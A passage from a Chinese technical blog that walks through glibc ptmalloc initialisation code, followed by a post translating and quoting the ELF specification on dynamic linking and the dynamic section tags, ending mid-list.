<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    fork_handler* __atg4_old = newp-&gt;next;</div><div class="line">    long __gmemp = &amp;__fork_handlers;</div><div class="line">    ATOMIC();</div><div class="line">    fork_handler* __gret = *__gmemp;</div><div class="line">    fork_handler* __gnewval = newp;</div><div class="line">    if (__gret == __atg4_old)</div><div class="line">       *__gmemp = newp;</div><div class="line">    ENDATOMIC();</div><div class="line">    __gret;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p>gcc会将这段代码进行编译，生成的代码无法被中断。因此简单说来，<code>__linkin_atfork</code>就是将<code>fork_handler</code>原子添加进全局链表<code>__fork_handlers</code>中。</p>
<p>回到ptmalloc_init函数中，接下来就是进行环境变量的设置，<code>__glibc_likely</code>和gcc的编译优化相关，不管他。<code>_environ</code>就是<code>__environ</code>，里面保存了环境变量，下面就是根据各个环境变量调用<code>__libc_mallopt</code>进行设置，后面来看这个函数。</p>
<p><code>ptmalloc_init</code>然后获取<code>__malloc_initialize_hook</code>函数指针并执行，由于该函数和malloc没有直接关系，这里不管它。最后将<code>__malloc_initialized</code>设置为1，表是初始化完成。</p>
<h2 id="libc-mallopt"><a href="#libc-mallopt" class="headerlink" title="__libc_mallopt"></a>__libc_mallopt</h2><p><code>__libc_mallopt</code>定义在malloc.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">int __libc_mallopt(int param_number, int value) &#123;</div><div class="line">    mstate av = &amp;main_arena;</div><div class="line">    int res = 1;</div><div class="line"></div><div class="line">    if (__malloc_initialized &lt; 0)</div><div class="line">        ptmalloc_init();</div><div class="line">    (void) mutex_lock(&amp;av-&gt;mutex);</div><div class="line">    malloc_consolidate(av);</div><div class="line"></div><div class="line">    LIBC_PROBE (memory_mallopt, 2, param_number, value);</div><div class="line"></div><div class="line">    switch (param_number) &#123;</div><div class="line">    case M_MXFAST:</div><div class="line">        if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ());</div><div class="line">            set_max_fast(value);</div><div class="line">        &#125; else</div><div class="line">            res = 0;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_TRIM_THRESHOLD:</div><div class="line">        LIBC_PROBE (memory_mallopt_trim_threshold, 3, value,</div><div class="line">                mp_.trim_threshold, mp_.no_dyn_threshold);</div><div class="line">        mp_.trim_threshold = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_TOP_PAD:</div><div class="line">        LIBC_PROBE (memory_mallopt_top_pad, 3, value,</div><div class="line">                mp_.top_pad, mp_.no_dyn_threshold);</div><div class="line">        mp_.top_pad = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_MMAP_THRESHOLD:</div><div class="line">        if ((unsigned long) value &gt; HEAP_MAX_SIZE / 2)</div><div class="line">            res = 0;</div><div class="line">        else &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value,</div><div class="line">                    mp_.mmap_threshold, mp_.no_dyn_threshold);</div><div class="line">            mp_.mmap_threshold = value;</div><div class="line">            mp_.no_dyn_threshold = 1;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_MMAP_MAX:</div><div class="line">        LIBC_PROBE (memory_mallopt_mmap_max, 3, value,</div><div class="line">                mp_.n_mmaps_max, mp_.no_dyn_threshold);</div><div class="line">        mp_.n_mmaps_max = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_CHECK_ACTION:</div><div class="line">        LIBC_PROBE (memory_mallopt_check_action, 2, value, check_action);</div><div class="line">        check_action = value;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_PERTURB:</div><div class="line">        LIBC_PROBE (memory_mallopt_perturb, 2, value, perturb_byte);</div><div class="line">        perturb_byte = value;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_ARENA_TEST:</div><div class="line">        if (value &gt; 0) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_arena_test, 2, value, mp_.arena_test);</div><div class="line">            mp_.arena_test = value;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_ARENA_MAX:</div><div class="line">        if (value &gt; 0) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_arena_max, 2, value, mp_.arena_max);</div><div class="line">            mp_.arena_max = value;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">    (void) mutex_unlock(&amp;av-&gt;mutex);</div><div class="line">    return res;</div><div class="line">&#125;</div><div class="line">libc_hidden_def( __libc_mallopt)</div></pre></td></tr></table></figure>
<p>首先通过<code>__malloc_initialized</code>判断如果ptmalloc还未初始化，就调用<code>ptmalloc_init</code>进行初始化。<code>malloc_consolidate</code>用来将fast bins中的chunk合并，并且里面会初始化主分配区，后面的章节会分析到这个函数。然后就根据传入的<code>param_number</code>设置<code>mp_</code>，<code>mp_</code>代表ptmalloc的各个全局参数，其默认定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">static struct malloc_par mp_ = &#123; </div><div class="line">    .top_pad = DEFAULT_TOP_PAD, </div><div class="line">    .n_mmaps_max = DEFAULT_MMAP_MAX, </div><div class="line">    .mmap_threshold = DEFAULT_MMAP_THRESHOLD, </div><div class="line">    .trim_threshold = DEFAULT_TRIM_THRESHOLD,</div><div class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</div><div class="line">    .arena_test = NARENAS_FROM_NCORES(1) </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这里不分析里面各个参数的意义，到后面用到时再来分析。<code>malloc_hook_ini</code>最后会回调<code>__libc_malloc</code>函数，这次<code>__malloc_hook</code>为null，因此继续看下面的代码。</p>
<h2 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h2><p>接下来通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在arena.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define arena_get(ptr, size) do &#123; \</div><div class="line">      arena_lookup (ptr);                             \</div><div class="line">      arena_lock (ptr, size);                             \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>arena_lookup</code>从私有变量里获取分配区指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define arena_lookup(ptr) do &#123; \</div><div class="line">      void *vptr = NULL;                              \</div><div class="line">      ptr = (mstate) tsd_getspecific (arena_key, vptr);               \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>tsd_getspecific</code>也是个宏定义，就是获取前面调用<code>tsd_setspecific</code>设置的分配区指针，这里取出的可能是主分配去指针，也可能是非主分配去指针，然后调用<code>arena_lock</code>对<code>malloc_state</code>中的<code>mutex</code>加锁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define arena_lock(ptr, size) do &#123;                        \</div><div class="line">      if (ptr &amp;&amp; !arena_is_corrupt (ptr))                     \</div><div class="line">        (void) mutex_lock (&amp;ptr-&gt;mutex);                      \</div><div class="line">      else                                    \</div><div class="line">        ptr = arena_get2 (ptr, (size), NULL);                     \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p>获得分配去的指针后，就会调用<code>_int_malloc</code>开始分配内存了，下一章分析这个函数。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/20/Dynamic-Linking/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/20/Dynamic-Linking/" itemprop="url">Dynamic Linking</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-20T22:26:26+08:00">
                2018-04-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h3><p><a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html" target="_blank" rel="external">http://www.sco.com/developers/gabi/latest/ch5.dynamic.html</a></p>
<h3 id="程序解释器（Program-Interpreter）"><a href="#程序解释器（Program-Interpreter）" class="headerlink" title="程序解释器（Program Interpreter）"></a>程序解释器（Program Interpreter）</h3><p>可执行程序在动态链接的过程中会有 <code>PT_INTERP</code> 程序段。exec(BA_OS)过程中，系统通过<code>PT_INTERP</code>获取路径名并且创建最初的解释器解释的文件段镜像。这就是说，程序不使用可执行文件原始的段镜像，而是另外创建一块内存给解释器。然后，解释器获得程序的控制权并提供相应的运行环境。</p>
<p>解释器获得控制权有两种方式：</p>
<ol>
<li>利用文件描述符去读取或者映射可执行文件的段到内存中。</li>
<li>系统依赖可执行文件的格式，加载可执行文件到内存</li>
</ol>
<p>由于文件描述符可能存在异常，因此解释器的初始进程状态需要与可执行文件接收的内容相匹配。 解释器可以不需要另外的解释器来解释，也即可以自解释；解释器可以是共享对象或可执行文件。</p>
<ul>
<li>共享对象：正常情况下是位置独立加载的，地址可能因进程而异; 系统会在mmap(KE_OS)和相关服务使用的动态段区域中创建段。因此，共享对象解释器通常不会与原始可执行文件的原始段地址冲突。</li>
<li>可执行文件：可能加载在固定地址处; 如果是这样，系统将使用程序头表中的虚拟地址创建其段。 因此，可执行文件解释器的虚拟地址可能与第一个可执行文件发生冲突; 解释器需要负责解决冲突。</li>
</ul>
<h3 id="动态链接器（Dynamic-Linker）"><a href="#动态链接器（Dynamic-Linker）" class="headerlink" title="动态链接器（Dynamic Linker）"></a>动态链接器（Dynamic Linker）</h3><p>当动态链接编译可执行文件，链接器将会在程序头加入<code>PT_INTERP</code>，以告诉系统用动态链接器作为程序解释器。</p>
<p><em>提供动态连接器的系统位置是特定于处理器的。</em></p>
<p>exec(BA_OS)和动态链接共同创建了程序的过程映像，过程如下：</p>
<ul>
<li>将可执行文件的内存段加入过程映像</li>
<li>将共享对象的内存段加入过程映像</li>
<li>对可执行文件及其共享对象执行重定向</li>
<li>如果文件描述符被交给动态链接器，就关闭用于读取可执行文件的文件描述符</li>
</ul>
<h3 id="Program-Interpreter"><a href="#Program-Interpreter" class="headerlink" title="Program Interpreter"></a>Program Interpreter</h3><p>An executable file that participates in dynamic linking shall have one <code>PT_INTERP</code> program header element. During <code>exec</code>(BA_OS), the system retrieves a path name from the <code>PT_INTERP</code> segment and creates the initial process image from the interpreter file&#39;s segments. That is, instead of using the original executable file&#39;s segment images, the system composes a memory image for the interpreter. It then is the interpreter&#39;s responsibility to receive control from the system and provide an environment for the application program.</p>
<p>As &#39;&#39;Process Initialization&#39;&#39; in Chapter 3 of the processor supplement mentions, the interpreter receives control in one of two ways. First, it may receive a file descriptor to read the executable file, positioned at the beginning. It can use this file descriptor to read and/or map the executable file&#39;s segments into memory. Second, depending on the executable file format, the system may load the executable file into memory instead of giving the interpreter an open file descriptor. With the possible exception of the file descriptor, the interpreter&#39;s initial process state matches what the executable file would have received. The interpreter itself may not require a second interpreter. An interpreter may be either a shared object or an executable file.</p>
<ul>
<li>A shared object (the normal case) is loaded as position-independent, with addresses that may vary from one process to another; the system creates its segments in the dynamic segment area used by mmap(KE_OS) and related services [See <code></code>Virtual Address Space&#39;&#39; in Chapter 3 of the processor supplement]. Consequently, a shared object interpreter typically will not conflict with the original executable file&#39;s original segment addresses.</li>
<li>An executable file may be loaded at fixed addresses; if so, the system creates its segments using the virtual addresses from the program header table. Consequently, an executable file interpreter&#39;s virtual addresses may collide with the first executable file; the interpreter is responsible for resolving conflicts.</li>
</ul>
<h3 id="Dynamic-Linker"><a href="#Dynamic-Linker" class="headerlink" title="Dynamic Linker"></a>Dynamic Linker</h3><p>When building an executable file that uses dynamic linking, the link editor adds a program header element of type <code>PT_INTERP</code>  to an executable file, telling the system to invoke the dynamic linker as the program interpreter.</p>
<hr>
<p> The locations of the system provided dynamic linkers are processor specific.</p>
<hr>
<p><code>Exec</code>(BA_OS) and the dynamic linker cooperate to create the process image for the program, which entails the following actions:</p>
<ul>
<li>Adding the executable file&#39;s memory segments to the process image;</li>
<li>Adding shared object memory segments to the process image;</li>
<li>Performing relocations for the executable file and its shared objects;</li>
<li>Closing the file descriptor that was used to read the executable file, if one was given to the dynamic linker;</li>
<li>Transferring control to the program, making it look as if the program had received control directly from<code>exec</code>(BA_OS).</li>
</ul>
<p>The link editor also constructs various data that assist the dynamic linker for executable and shared object files. As shown above in <a href="http://www.sco.com/developers/gabi/latest/ch5.pheader.html" target="_blank" rel="external">&#39;&#39;&#39;Program Header&#39;&#39;</a>, this data resides in loadable segments, making them available during execution. (Once again, recall the exact segment contents are processor-specific. See the processor supplement for complete information).</p>
<ul>
<li>A <code>.dynamic</code>section with type <code>SHT_DYNAMIC</code>holds various data. The structure residing at the beginning of the section holds the addresses of other dynamic linking information.</li>
<li>The <code>.hash</code>section with type <code>SHT_HASH</code>holds a symbol hash table.</li>
<li>The <code>.got</code> and <code>.plt</code> sections with type <code>SHT_PROGBITS</code> hold two separate tables: the global offset table and the procedure linkage table. Chapter 3 discusses how programs use the global offset table for position-independent code. Sections below explain how the dynamic linker uses and changes the tables to create memory images for object files.</li>
</ul>
<p>Because every ABI-conforming program imports the basic system services from a shared object library [See &#39;&#39;System Library&#39;&#39; in Chapter 6], the dynamic linker participates in every ABI-conforming program execution.</p>
<p>As &#39;&#39;Program Loading&#39;&#39; explains in the processor supplement, shared objects may occupy virtual memory addresses that are different from the addresses recorded in the file&#39;s program header table. The dynamic linker relocates the memory image, updating absolute addresses before the application gains control. Although the absolute address values would be correct if the library were loaded at the addresses specified in the program header table, this normally is not the case.</p>
<p>If the process environment [see <code>exec</code>(BA_OS)] contains a variable named <code>LD_BIND_NOW</code> with a non-null value, the dynamic linker processes all relocations before transferring control to the program. For example, all the following environment entries would specify this behavior.</p>
<ul>
<li>LD_BIND_NOW=1</li>
<li>LD_BIND_NOW=on</li>
<li>LD_BIND_NOW=off</li>
</ul>
<p>Otherwise, <code>LD_BIND_NOW</code> either does not occur in the environment or has a null value. The dynamic linker is permitted to evaluate procedure linkage table entries lazily, thus avoiding symbol resolution and relocation overhead for functions that are not called. See &#39;&#39;Procedure Linkage Table&#39;&#39; in this chapter of the processor supplement for more information.</p>
<h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p>If an object file participates in dynamic linking, its program header table will have an element of type<code>PT_DYNAMIC</code>. This &#39;&#39;segment&#39;&#39; contains the <code>.dynamic</code> section. A special symbol, <code>_DYNAMIC</code>, labels the section, which contains an array of the following structures.</p>
<hr>
<p>Figure 5-9: Dynamic Structure</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">typedef struct &#123;</div><div class="line">	Elf32_Sword	d_tag;</div><div class="line">   	union &#123;</div><div class="line">   		Elf32_Word	d_val;</div><div class="line">   		Elf32_Addr	d_ptr;</div><div class="line">	&#125; d_un;</div><div class="line">&#125; Elf32_Dyn;</div><div class="line"></div><div class="line">extern Elf32_Dyn	_DYNAMIC[];</div><div class="line"></div><div class="line">typedef struct &#123;</div><div class="line">	Elf64_Sxword	d_tag;</div><div class="line">   	union &#123;</div><div class="line">   		Elf64_Xword	d_val;</div><div class="line">   		Elf64_Addr	d_ptr;</div><div class="line">	&#125; d_un;</div><div class="line">&#125; Elf64_Dyn;</div><div class="line"></div><div class="line">extern Elf64_Dyn	_DYNAMIC[];</div></pre></td></tr></table></figure>
<hr>
<p>For each object with this type, <code>d_tag</code> controls the interpretation of <code>d_un</code>.</p>
<ul>
<li><p><code>d_val</code></p>
<p>These objects represent integer values with various interpretations.</p>
</li>
<li><p><code>d_ptr</code></p>
<p>These objects represent program virtual addresses. As mentioned previously, a file&#39;s virtual addresses might not match the memory virtual addresses during execution. When interpreting addresses contained in the dynamic structure, the dynamic linker computes actual addresses, based on the original file value and the memory base address. For consistency, files do <em>not</em> contain relocation  entries to &quot; correct&#39;&#39; addresses in the dynamic structure.   </p>
</li>
</ul>
<p>To make it simpler for tools to interpret the contents of dynamic section entries, the value of each tag, except for those in two special compatibility ranges, will determine the interpretation of the <code>d_un</code> union. A tag whose value is an even number indicates a dynamic section entry that uses <code>d_ptr</code>. <strong>A tag whose value is an odd number indicates a dynamic section entry that uses <code>d_val</code> or that uses neither <code>d_ptr</code> nor <code>d_val</code></strong>. Tags whose values are less than the special value <code>DT_ENCODING</code> and tags whose values fall between <code>DT_HIOS</code> and <code>DT_LOPROC</code> do not follow these rules.</p>
<p>The following table summarizes the tag requirements for executable and shared object files. If a tag is marked &quot;mandatory&#39;&#39;, the dynamic linking array for an ABI-conforming file must have an entry of that type. Likewise, &quot;optional&#39;&#39; means an entry for the tag may appear but is not required.</p>
<hr>
<p>Figure 5-10: Dynamic Array Tags <code>d_tag</code></p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><code>d_un</code></th>
<th><strong>Executable</strong></th>
<th><strong>Shared Object</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DT_NULL</code></td>
<td><code>0</code></td>
<td>ignored</td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_NEEDED</code></td>
<td><code>1</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTRELSZ</code></td>
<td><code>2</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTGOT</code></td>
<td><code>3</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_HASH</code></td>
<td><code>4</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_STRTAB</code></td>
<td><code>5</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_SYMTAB</code></td>
<td><code>6</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_RELA</code></td>
<td><code>7</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELASZ</code></td>
<td><code>8</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELAENT</code></td>
<td><code>9</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_STRSZ</code></td>
<td><code>10</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_SYMENT</code></td>
<td><code>11</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>mandatory</td>
</tr>
<tr>
<td><code>DT_INIT</code></td>
<td><code>12</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI</code></td>
<td><code>13</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_SONAME</code></td>
<td><code>14</code></td>
<td><code>d_val</code></td>
<td>ignored</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RPATH*</code></td>
<td><code>15</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_SYMBOLIC*</code></td>
<td><code>16</code></td>
<td>ignored</td>
<td>ignored</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_REL</code></td>
<td><code>17</code></td>
<td><code>d_ptr</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELSZ</code></td>
<td><code>18</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RELENT</code></td>
<td><code>19</code></td>
<td><code>d_val</code></td>
<td>mandatory</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_PLTREL</code></td>
<td><code>20</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_DEBUG</code></td>
<td><code>21</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_TEXTREL*</code></td>
<td><code>22</code></td>
<td>ignored</td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_JMPREL</code></td>
<td><code>23</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_BIND_NOW*</code></td>
<td><code>24</code></td>
<td>ignored</td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_INIT_ARRAY</code></td>
<td><code>25</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI_ARRAY</code></td>
<td><code>26</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_INIT_ARRAYSZ</code></td>
<td><code>27</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FINI_ARRAYSZ</code></td>
<td><code>28</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_RUNPATH</code></td>
<td><code>29</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_FLAGS</code></td>
<td><code>30</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_ENCODING</code></td>
<td><code>32</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_PREINIT_ARRAY</code></td>
<td><code>32</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_PREINIT_ARRAYSZ</code></td>
<td><code>33</code></td>
<td><code>d_val</code></td>
<td>optional</td>
<td>ignored</td>
</tr>
<tr>
<td><code>DT_SYMTAB_SHNDX</code></td>
<td><code>34</code></td>
<td><code>d_ptr</code></td>
<td>optional</td>
<td>optional</td>
</tr>
<tr>
<td><code>DT_LOOS</code></td>
<td><code>0x6000000D</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_HIOS</code></td>
<td><code>0x6ffff000</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_LOPROC</code></td>
<td><code>0x70000000</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
<tr>
<td><code>DT_HIPROC</code></td>
<td><code>0x7fffffff</code></td>
<td>unspecified</td>
<td>unspecified</td>
<td>unspecified</td>
</tr>
</tbody>
</table>
<p>* Signifies an entry that is at level 2.</p>
<hr>
<ul>
<li><p><code>DT_NULL</code></p>
<p>An entry with a <code>DT_NULL</code> tag marks the end of the <code>_DYNAMIC</code> array.</p>
</li>
<li><p><code>DT_NEEDED</code></p>
<p>This element holds the string table offset of a null-terminated string, giving the name of a needed library. The offset is an index into the table recorded in the <code>DT_STRTAB</code> code. See <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#shobj_dependencies" target="_blank" rel="external">&quot;Shared Object Dependencies&#39;&#39;</a> for more information about these names. The dynamic array may contain multiple entries with this type. These entries&#39; relative order is significant, though their relation to entries of other types is not.</p>
</li>
<li><p><code>DT_PLTRELSZ</code></p>
<p>This element holds the total size, in bytes, of the relocation entries associated with the procedure linkage table. If an entry of type <code>DT_JMPREL</code> is present, a <code>DT_PLTRELSZ</code> must accompany it.</p>
</li>
<li><p><code>DT_PLTGOT</code></p>
<p>This element holds an address associated with the procedure linkage table and/or the global offset table. See this section in the processor supplement for details.</p>
</li>
<li><p><code>DT_HASH</code></p>
<p>This element holds the address of the symbol hash table, described in <a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#hash" target="_blank" rel="external">&quot;Hash Table&#39;&#39;</a>. This hash table refers to the symbol table referenced by the <code>DT_SYMTAB</code> element.</p>
</li>
<li><p><code>DT_STRTAB</code></p>
<p>This element holds the address of the string table, described in Chapter 4. Symbol names, library names, and other strings reside in this table.</p>
</li>
<li><p><code>DT_SYMTAB</code></p>
<p>This element holds the address of the symbol table, described in the first part of this chapter, with <code>Elf32_Sym</code> entries for the 32-bit class of files and <code>Elf64_Sym</code> entries for the 64-bit class of files.</p>
</li>
<li><p><code>DT_RELA</code></p>
<p>This element holds the address of a relocation table, described in Chapter 4. Entries in the table have explicit addends, such as <code>Elf32_Rela</code> for the 32-bit file class or <code>Elf64_Rela</code> for the 64-bit file class. An object file may have multiple relocation sections. When building the relocation table for an executable or shared object file, the link editor catenates those sections to form a single table. Although the sections remain independent in the object file, the dynamic linker sees a single table. When the dynamic linker creates the process image for an executable file or adds a shared object to the process image, it reads the relocation table and performs the associated actions. If this element is present, the dynamic structure must also have <code>DT_RELASZ</code> and <code>DT_RELAENT</code> elements. When relocation is “mandatory&#39;&#39; for a file, either <code>DT_RELA</code> or <code>DT_REL</code> may occur (both are permitted but not required).</p>
</li>
<li><p><code>DT_RELASZ</code></p>
<p>This element holds the total size, in bytes, of the <code>DT_RELA</code> relocation table.</p>
</li>
<li><p><code>DT_RELAENT</code></p>
<p>This element holds the size, in bytes, of the <code>DT_RELA</code> relocation entry.</p>
</li>
<li><p><code>DT_STRSZ</code></p>
<p>This element holds the size, in bytes, of the string table.</p>
</li>
<li><p><code>DT_SYMENT</code></p>
